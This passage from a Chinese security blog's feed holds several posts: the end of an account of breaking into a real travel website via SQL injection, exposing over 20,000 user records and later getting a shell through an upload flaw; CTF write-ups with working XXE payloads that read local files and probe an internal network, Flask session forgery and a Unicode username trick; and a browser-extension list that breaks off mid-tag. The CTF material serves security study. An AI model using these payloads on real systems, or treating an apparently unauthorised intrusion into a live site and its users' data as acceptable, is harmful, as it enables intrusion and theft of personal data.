title="拿shell??"></a>拿shell??</h1><p>网上说sqlmap可用–os-shell且知道网站根目录可拿shell,上面我们已经得到了网站根目录路径，尝试了下拿shell，失败，卒。。。</p><p>后来在它一个客服系统子站找到了一个上传漏洞，拿到了shell,详情见下一篇博客。</p><h1 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h1><p>这次渗透收获颇丰，也是这个站防护太差才让我这个小菜鸡都能渗透进去的，hahaha。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;说明&quot;&gt;&lt;a href=&quot;#说明&quot; class=&quot;headerlink&quot; title=&quot;说明&quot;&gt;&lt;/a&gt;说明&lt;/h1&gt;&lt;p&gt;测试目标是一个旅游网站，发现了sql注入漏洞，泄露2万多用户信息，可任意下载服务器上文件。&lt;/p&gt;
&lt;p&gt;所有可利用信息均打码处理。&lt;/p&gt;
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://zssblog.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透测试" scheme="http://zssblog.top/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>CTF XXE漏洞攻击</title>
    <link href="http://zssblog.top/2020/05/07/CTF-XXE%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB/"/>
    <id>http://zssblog.top/2020/05/07/CTF-XXE%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB/</id>
    <published>2020-05-07T07:58:00.000Z</published>
    <updated>2020-05-31T10:12:08.046Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Fake-XML-Cookbook"><a href="#Fake-XML-Cookbook" class="headerlink" title="Fake XML Cookbook"></a>Fake XML Cookbook</h1><p>F12 查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doLogin</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">var</span> username = $(<span class="string">"#username"</span>).val();</span><br><span class="line"><span class="keyword">var</span> password = $(<span class="string">"#password"</span>).val();</span><br><span class="line"><span class="keyword">if</span>(username == <span class="string">""</span> || password == <span class="string">""</span>)&#123;</span><br><span class="line">alert(<span class="string">"Please enter the username and password!"</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> data = <span class="string">"&lt;user&gt;&lt;username&gt;"</span> + username + <span class="string">"&lt;/username&gt;&lt;password&gt;"</span> + password + <span class="string">"&lt;/password&gt;&lt;/user&gt;"</span>; </span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: <span class="string">"POST"</span>,</span><br><span class="line">        url: <span class="string">"doLogin.php"</span>,</span><br><span class="line">        contentType: <span class="string">"application/xml;charset=utf-8"</span>,</span><br><span class="line">        data: data,</span><br><span class="line">        dataType: <span class="string">"xml"</span>,</span><br><span class="line">        anysc: <span class="keyword">false</span>,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span> <span class="params">(result)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> code = result.getElementsByTagName(<span class="string">"code"</span>)[<span class="number">0</span>].childNodes[<span class="number">0</span>].nodeValue;</span><br><span class="line">        <span class="keyword">var</span> msg = result.getElementsByTagName(<span class="string">"msg"</span>)[<span class="number">0</span>].childNodes[<span class="number">0</span>].nodeValue;</span><br><span class="line">        <span class="keyword">if</span>(code == <span class="string">"0"</span>)&#123;</span><br><span class="line">        $(<span class="string">".msg"</span>).text(msg + <span class="string">" login fail!"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(code == <span class="string">"1"</span>)&#123;</span><br><span class="line">        $(<span class="string">".msg"</span>).text(msg + <span class="string">" login success!"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $(<span class="string">".msg"</span>).text(<span class="string">"error:"</span> + msg);</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        error: <span class="function"><span class="keyword">function</span> <span class="params">(XMLHttpRequest,textStatus,errorThrown)</span> </span>&#123;</span><br><span class="line">            $(<span class="string">".msg"</span>).text(errorThrown + <span class="string">':'</span> + textStatus);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到传输的数据是xml类型<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200507154531604.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><p>payload打一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span> </span><br><span class="line">&lt;!DOCTYPE any [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM <span class="string">"file:///flag"</span> &gt;]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;<span class="number">111</span>&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><h1 id="True-XML-Cookbook"><a href="#True-XML-Cookbook" class="headerlink" title="True XML Cookbook"></a>True XML Cookbook</h1><p>首先尝试直接读/flag文件，回显了报错信息，但是发现可以读doLogin文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE any[</span><br><span class="line">  &lt;!ENTITY file SYSTEM <span class="string">"php://filter/read=convert.base64-encode/resource=/var/www/html/doLogin.php"</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;file;&lt;/username&gt;&lt;password&gt;<span class="number">1</span>&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><p>得源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//doLogin.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>\n<span class="comment">/**</span></span><br><span class="line"><span class="comment">* autor: c0ny1\n* date: 2018-2-7</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">$USERNAME = <span class="string">'admin'</span>; <span class="comment">//\xe8\xb4\xa6\xe5\x8f\xb7</span></span><br><span class="line">$PASSWORD = <span class="string">'024b87931a03f738fff6693ce0a78c88'</span>; <span class="comment">//\xe5\xaf\x86\xe7\xa0\x81</span></span><br><span class="line">$result = <span class="keyword">null</span>;</span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">$creds = simplexml_import_dom($dom);</span><br><span class="line"></span><br><span class="line">$username = $creds-&gt;username;</span><br><span class="line">$password = $creds-&gt;password;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($username == $USERNAME &amp;&amp; $password == $PASSWORD)&#123;</span><br><span class="line">$result = sprintf(<span class="string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span>,<span class="number">1</span>,$username);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$result = sprintf(<span class="string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span>,<span class="number">0</span>,$username);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="keyword">Exception</span> $e)&#123;</span><br><span class="line">$result = sprintf(<span class="string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span>,<span class="number">3</span>,$e-&gt;getMessage());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(<span class="string">'Content-Type: text/html; charset=utf-8'</span>);</span><br><span class="line"><span class="keyword">echo</span> $result;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最终是利用ssrf读内网文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /etc/hosts</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>localhost</span><br><span class="line">::<span class="number">1</span>localhost ip6-localhost ip6-loopback</span><br><span class="line">fe00::<span class="number">0</span>ip6-localnet</span><br><span class="line">ff00::<span class="number">0</span>ip6-mcastprefix</span><br><span class="line">ff02::<span class="number">1</span>ip6-allnodes</span><br><span class="line">ff02::<span class="number">2</span>ip6-allrouters</span><br><span class="line"><span class="number">173.17</span><span class="number">.80</span><span class="number">.9</span>osrc</span><br></pre></td></tr></table></figure><p>内网ip，173.17.80.9</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// /proc/net/arp</span><br><span class="line">IP address       HW type     Flags       HW address            Mask     Device</span><br><span class="line"><span class="number">173.17</span>.<span class="number">80.2</span>      <span class="number">0</span>x1         <span class="number">0</span>x2         <span class="number">02</span>:<span class="number">42</span>:ad:<span class="number">11</span>:<span class="number">50</span>:<span class="number">02</span>     *        eth0</span><br><span class="line"><span class="number">173.17</span>.<span class="number">80.12</span>     <span class="number">0</span>x1         <span class="number">0</span>x2         <span class="number">02</span>:<span class="number">42</span>:ad:<span class="number">11</span>:<span class="number">50</span>:<span class="number">0</span>c     *        eth0</span><br></pre></td></tr></table></figure><p>最后试了173.17.80.10可以得flag<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200302112638332.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L291YmFzYW5nZGFkYWRh,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><h1 id="ISCC-未知的风险-1"><a href="#ISCC-未知的风险-1" class="headerlink" title="ISCC  未知的风险-1"></a>ISCC  未知的风险-1</h1><p>前面是jwt爆破得到秘钥123456伪造user用户就不说了，之后是一个登录框，和上面两个题目差不多，doLogin()方法相同，题目根目录下有flag.php。用xxe读取文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE any[</span><br><span class="line">  &lt;!ENTITY file SYSTEM <span class="string">"php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php"</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;file;&lt;/username&gt;&lt;password&gt;<span class="number">1</span>&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200507155154905.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><blockquote><p>读取/var/www/html是因为这是Apache默认根目录</p></blockquote><p>base64解码即可<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200507155712628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/oubasangdadada/article/details/104608104" target="_blank" rel="noopener">某个(忘了)比赛的两道XML</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Fake-XML-Cookbook&quot;&gt;&lt;a href=&quot;#Fake-XML-Cookbook&quot; class=&quot;headerlink&quot; title=&quot;Fake XML Cookbook&quot;&gt;&lt;/a&gt;Fake XML Cookbook&lt;/h1&gt;&lt;p&gt;F12 查看源码：&lt;
      
    
    </summary>
    
    
      <category term="CTF-WEB" scheme="http://zssblog.top/categories/CTF-WEB/"/>
    
    
      <category term="CTF-WEB" scheme="http://zssblog.top/tags/CTF-WEB/"/>
    
  </entry>
  
  <entry>
    <title>[HCTF 2018]admin wp</title>
    <link href="http://zssblog.top/2020/05/03/HCTF-2018-admin-wp/"/>
    <id>http://zssblog.top/2020/05/03/HCTF-2018-admin-wp/</id>
    <published>2020-05-03T10:41:00.000Z</published>
    <updated>2020-05-31T10:13:54.098Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目说明"><a href="#题目说明" class="headerlink" title="题目说明"></a>题目说明</h1><p>题目来源于BUUCTF,链接：<a href="https://buuoj.cn/challenges#[HCTF%202018]admin" target="_blank" rel="noopener">点我查看</a></p><h1 id="玄学-非预期解"><a href="#玄学-非预期解" class="headerlink" title="玄学 非预期解"></a>玄学 非预期解</h1><p>题目名称为admin,应该是让用admin登录</p><p>源码中也印证了这一点</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200503180231244.png"  alt="image-20200503180231244"></p><p>登录页面乱输密码试了下，输入123时然后它就登进去了！！！</p><p>这样的话暴力破解也能得到flag,但是以buuctf的web题难度想着不可能那么简单，于是搜了下wp，结合别人的wp又学到了不少，在此记录下</p><h1 id="flask-session伪造-也是非预期解"><a href="#flask-session伪造-也是非预期解" class="headerlink" title="flask session伪造(也是非预期解)"></a>flask session伪造(也是非预期解)</h1><p>flask中session是存储在客户端cookie中的，也就是存储在本地。我们可以修改session达到伪造admin用户的效果。</p><p>github有相应的脚本：<a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener">点我查看</a></p><p>但是session是加密的，我们需要知道秘钥才能修改session</p><h2 id="找秘钥"><a href="#找秘钥" class="headerlink" title="找秘钥"></a>找秘钥</h2><p>注册个账号登录后在修改密码页面有git源码</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200503180730036.png"  alt="image-20200503180730036"></p><p>下载下来在config.py中发现秘钥</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200503181122457.png"  alt="image-20200503181122457"></p><h2 id="伪造session"><a href="#伪造session" class="headerlink" title="伪造session"></a>伪造session</h2><p>然后我们就可以用脚本伪造session了</p><p>先解密原来的session</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.</span><br><span class="line">py decode -s <span class="string">"ckj123"</span> -c <span class="string">".eJw9kMGKwjAQhl9lmbOHbZuT4EFIt2whEwpTy-Qirq0mqXGhKtqI775VFk8D__fzDTN3WO-G7mRhfh4u3QzWroX5HT5-YA7YVAk2amRCz7FPlVQCCyU4_QrGo9XSOKS9UN5YDqseJaco-9uUZVqWjklFDtOMedQyv2qqMlPkV-ON51BHLMrA0QZTrJx6OqkNnNbTzjxTTTX1sMenI1YjFsbqphaKeNQNZ-hLr2krmFpn5HIBjxlsT8Nuff7tu-P7BE15ogu0iozTzXdkvxSY5qMie-C4F0aW1pBKkaqIobpxPHi8Ll46Fzb77m2qDytU_-S4CROABGZwOXXD62eQfMLjD-mobCE.Xq5sUg.8y1k1rWI_KY5cx0H4qGeLmOYtLw"</span></span><br></pre></td></tr></table></figure><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200503181608834.png"  alt="image-20200503181724452"></p><p>然后修改name为admin</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.</span><br><span class="line">py encode -s <span class="string">"ckj123"</span> -t <span class="string">"&#123;'_fresh': True, 'name': 'admin', 'image': b'RUM3', 'user_id': '10', '_id': b'5d55c2a3cc960384c8caff3a86b58826abed46649158782ba33bbbc13810947da0f6cbe34bfc8fdeb3afe7fce55a71d0f3d533c424fa9e81629f762c978a7bd0', 'csrf_token': b'9158ca16b9b3b087a218ec88d2ae365436d1c9c7'&#125;"</span></span><br></pre></td></tr></table></figure><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200503181802317.png"  alt="image-20200503182645495"></p><p>原来的session是这个样子</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200503181724452.png"  alt="image-20200503181608834"></p><p>我们把左边的session修改成上面的session</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200503181832435.png"  alt="image-20200503181832435"></p><p>就成功伪造了admin用户拿到flag</p><h1 id="unicode欺骗-预期解法"><a href="#unicode欺骗-预期解法" class="headerlink" title="unicode欺骗(预期解法)"></a>unicode欺骗(预期解法)</h1><p>其实这个解法才是原作者预期解法，只不过当时作者写的代码不打严谨，导致出现了许多非预期解法。</p><p>阅读源码，我们可以发现注册登录修改密码都用到了strlower转换成小写。而且这个函数是自定义的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strlower</span><span class="params">(username)</span>:</span></span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    <span class="keyword">return</span> username</span><br></pre></td></tr></table></figure><p>对于nodeprep.prepare函数就存在漏洞</p><p>对于字符ᴬ，调用一次函数会转换成A,再调用一次会转换成a</p><p>所以我们注册一个名为ᴬdmin的用户，正常登录。首页会显示我们的用户名为Admin</p><p>如果我们用Admin去修改密码，首先它调用strlower函数会把Admin转换为admin，这样我们其实就相当于改了admin的密码</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200503182645495.png"  alt="image-20200503181802317"></p><p>然后我们用admin用户和刚才修改的密码即可登录</p><h1 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h1><p>尽管出题人疏忽了，但对我们而言又学到了许多姿势，继续加油吧！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;题目说明&quot;&gt;&lt;a href=&quot;#题目说明&quot; class=&quot;headerlink&quot; title=&quot;题目说明&quot;&gt;&lt;/a&gt;题目说明&lt;/h1&gt;&lt;p&gt;题目来源于BUUCTF,链接：&lt;a href=&quot;https://buuoj.cn/challenges#[HCTF%2020
      
    
    </summary>
    
    
      <category term="CTF-WEB" scheme="http://zssblog.top/categories/CTF-WEB/"/>
    
    
      <category term="CTF-WEB" scheme="http://zssblog.top/tags/CTF-WEB/"/>
    
  </entry>
  
  <entry>
    <title>谷歌插件分享</title>
    <link href="http://zssblog.top/2020/04/23/%E8%B0%B7%E6%AD%8C%E6%8F%92%E4%BB%B6%E5%88%86%E4%BA%AB/"/>
    <id>http://zssblog.top/2020/04/23/%E8%B0%B7%E6%AD%8C%E6%8F%92%E4%BB%B6%E5%88%86%E4%BA%AB/</id>
    <published>2020-04-23T11:44:00.000Z</published>
    <updated>2020-05-31T10:10:06.269Z</updated>
    
    <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>谷歌浏览器算是我日常用的最多的软件了，之所以谷歌会那么强，很大一部分原因就是其丰富的插件便利了日常操作。</p><p>先放张这次要提及的所有插件的图</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200423182122284.png"  alt="image-20200423182122284"></p><p>接下来就一一为大家介绍下他们，Let’s go</p><h1 id="AdGuard-广告拦截器"><a href="#AdGuard-广告拦截器" class="headerlink" title="AdGuard 广告拦截器"></a>AdGuard 广告拦截器</h1><h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><p>拦截广告</p><h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>这个插件可以说是谷歌必备了，有了这个插件基本告别广告了，反正我现在是看不到广告。</p><p>有时候想看个广告还得把插件关上才能看到，没错就是那么爽。</p><h2 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接"></a>下载链接</h2><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200423183414224.png"  alt="image-20200423183414224"></p><p><a href="https://chrome.google.com/webstore/detail/adguard-adblocker/bgnkhhnnamicmpeenaelnjfhikgbkllg" target="_blank" rel="noopener">点我下载</a></p><h1 id="Infinity-新标签页-Pro"><a href="#Infinity-新标签页-Pro" class="headerlink" title="Infinity 新标签页 (Pro)"></a>Infinity 新标签页 (Pro)</h1><h2 id="功能-1"><a href="#功能-1" class="headerlink" title="功能"></a>功能</h2><p>美化主页，比如我现在的主页</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200423182427168.png"  alt="image-20200423182427168"></p><h2 id="说明-1"><a href="#说明-1" class="headerlink" title="说明"></a>说明</h2><p>主要元素是输入框和下面的标签</p><p>当然你也也可以点击右上角进行配置</p><p>支持自定义图片源、登录、备份恢复(这点非常方便)</p><p>具体怎样修改就不介绍了大家要是觉得耶，还挺好看那就自己摸索摸索</p><h2 id="下载链接-1"><a href="#下载链接-1" class="headerlink" title="下载链接"></a>下载链接</h2><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200423183516764.png"  alt="image-20200423183516764"></p><p><a href="https://chrome.google.com/webstore/detail/infinity-new-tab-pro/nnnkddnnlpamobajfibfdgfnbcnkgngh" target="_blank" rel="noopener">点我下载</a></p><h1 id="下载"><a href="#下载" class="headerlink" title="下载+"></a>下载+</h1><h2 id="功能-2"><a href="#功能-2" class="headerlink" title="功能"></a>功能</h2><p>管理谷歌下载，可通过点击插件显示正在下载的文件</p><h2 id="说明-2"><a href="#说明-2" class="headerlink" title="说明"></a>说明</h2><p>推荐这个插件主要是日常下载文件谷歌默认的下载好后还得去设置里找，左下角又不能看到最近下载记录，放个图</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200423184415967.png"  alt="image-20200423184415967"></p><h2 id="下载链接-2"><a href="#下载链接-2" class="headerlink" title="下载链接"></a>下载链接</h2><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200423184442056.png"  alt="image-20200423184442056"></p><p><a href="https://chrome.google.com/webstore/detail/download-plus/gokgophibdidjjpildcdbfpmcahilaaf" target="_blank" rel="noopener">点我下载</a></p><h1 id="猫抓"><a href="#猫抓" class="headerlink" title="猫抓"></a>猫抓</h1><h2 id="功能-3"><a href="#功能-3" class="headerlink" title="功能"></a>功能</h2><p>下载当前页面的视频文件</p><h2 id="说明-3"><a href="#说明-3" class="headerlink" title="说明"></a>说明</h2><p>有时我们想把一个页面上的文件下载下来，这个插件就很方便了，点击下可看到下载链接即可下载。注意有些页面探测不到比如爱奇艺那种会员电影了啥的，他们会有专门防这种下载机制的，但总体来说使用效果还行</p><h2 id="下载链接-3"><a href="#下载链接-3" class="headerlink" title="下载链接"></a>下载链接</h2><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200423184904486.png"  alt="image-20200423184904486"></p><p><a href="[https://chrome.google.com/webstore/detail/%E7%8C%AB%E6%8A%93/jfedfbgedapdagkghmgibemcoggfppbb](https://chrome.google.com/webstore/detail/猫抓/jfedfbgedapdagkghmgibemcoggfppbb)">点我下载</a></p><h1 id="Enable-Copy"><a href="#Enable-Copy" class="headerlink" title="Enable Copy"></a>Enable Copy</h1><h2 id="功能-4"><a href="#功能-4" class="headerlink" title="功能"></a>功能</h2><p>可以复制那些禁止用户复制的网页上的内容</p><h2 id="说明-4"><a href="#说明-4" class="headerlink" title="说明"></a>说明</h2><p>平常不常用，但有时还是会有需求，需要复制的时候点下插件即可。</p><p>比如复制某百某度某文某库上的文字(如有下载文档需求推荐冰点文库，免费下载转换成pdf)</p><h2 id="下载链接-4"><a href="#下载链接-4" class="headerlink" title="下载链接"></a>下载链接</h2><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200423185325975.png"  alt="image-20200423185325975"></p><p><a href="https://chrome.google.com/webstore/detail/enable-copy/lmnganadkecefnhncokdlaohlkneihio" target="_blank" rel="noopener">点我下载</a></p><h1 id="Full-Page-Screen-Capture"><a href="#Full-Page-Screen-Capture" class="headerlink" title="Full Page Screen Capture"></a>Full Page Screen Capture</h1><h2 id="功能-5"><a href="#功能-5" class="headerlink" title="功能"></a>功能</h2><p>网页全屏截图</p><h2 id="说明-5"><a href="#说明-5" class="headerlink" title="说明"></a>说明</h2><p>想什么呢，截个图还能有啥说明的，点下就截了，就那么简单</p><h2 id="下载链接-5"><a href="#下载链接-5" class="headerlink" title="下载链接"></a>下载链接</h2><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200423185616849.png"  alt="image-20200423185616849"></p><p><a href="https://chrome.google.com/webstore/detail/full-page-screen-capture/fdpohaocaechififmbbbbbknoalclacl" target="_blank" rel="noopener">点我下载</a></p><h1 id="LiveReload"><a href="#LiveReload" class="headerlink" title="LiveReload"></a>LiveReload</h1><h2 id="功能-6"><a href="#功能-6" class="headerlink" title="功能"></a>功能</h2><p>配合sublime的livreload实现sublime保存代码浏览器即使刷新</p><h2 id="说明-6"><a href="#说明-6" class="headerlink" title="说明"></a>说明</h2><p>日常web开发保存代码后还得在浏览器刷新下才能看到效果，有了它省事多了</p><p>具体实现见我的另一篇博客：<a href="http://39.107.45.243/2020/04/08/sublime%E6%95%99%E7%A8%8B/" target="_blank" rel="noopener">点我查看</a></p><h2 id="下载链接-6"><a href="#下载链接-6" class="headerlink" title="下载链接"></a>下载链接</h2><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200423190006580.png"  alt="image-20200423190006580"></p><p><a href="https://chrome.google.com/webstore/detail/livereload/jnihajbhpnppcggbcgedagnkighmdlei" target="_blank" rel="noopener">点我下载</a></p><h1 id="沙拉查词"><a href="#沙拉查词" class="headerlink" title="沙拉查词"></a>沙拉查词</h1><h2 id="功能-7"><a href="#功能-7" class="headerlink" title="功能"></a>功能</h2><p>英语渣渣拯救者，选中英语单词即可翻译</p><h2 id="说明-7"><a href="#说明-7" class="headerlink" title="说明"></a>说明</h2><p>功能很强大，选项中可设置词典比如优先是谷歌翻译还是百度翻译这种</p><p>但目前我用的是油猴插件里的一个查词(为了节省资源)</p><p><img src="/" class="lazyload" 